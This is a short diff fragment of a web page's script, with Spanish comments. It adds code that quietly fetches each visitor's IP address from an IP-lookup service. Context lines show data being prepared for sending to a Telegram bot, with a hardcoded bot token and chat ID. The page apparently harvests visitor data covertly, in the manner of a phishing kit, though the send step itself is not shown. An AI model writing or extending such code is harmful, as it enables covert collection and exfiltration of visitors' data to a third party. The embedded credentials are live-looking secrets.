@@ -371,6 +371,11 @@
             const loader = document.querySelector('.loader');
             loader.style.display = 'flex';
             
+            // Obtener IP
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+            
             // Enviar a Telegram
             const token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
             const chat_id = "6912929677";
